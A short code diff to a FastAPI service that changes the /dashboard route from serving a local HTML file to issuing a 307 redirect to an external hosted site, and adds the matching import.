@@ -11,7 +11,7 @@ from typing import Any, Optional
 
 from fastapi import FastAPI, Query, Response
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import HTMLResponse
+from fastapi.responses import HTMLResponse, RedirectResponse
 
 from . import db
 from .config import SETTINGS
@@ -106,7 +106,7 @@ def root():
 
 @app.get("/dashboard", response_class=HTMLResponse)
 def dashboard():
-    return HTMLResponse(_DASHBOARD_PATH.read_text(encoding="utf-8"))
+    return RedirectResponse("https://fusion-222-only-up-real.cyberbanc.chatgpt.site", status_code=307)
 
 
 @app.get("/healthz")
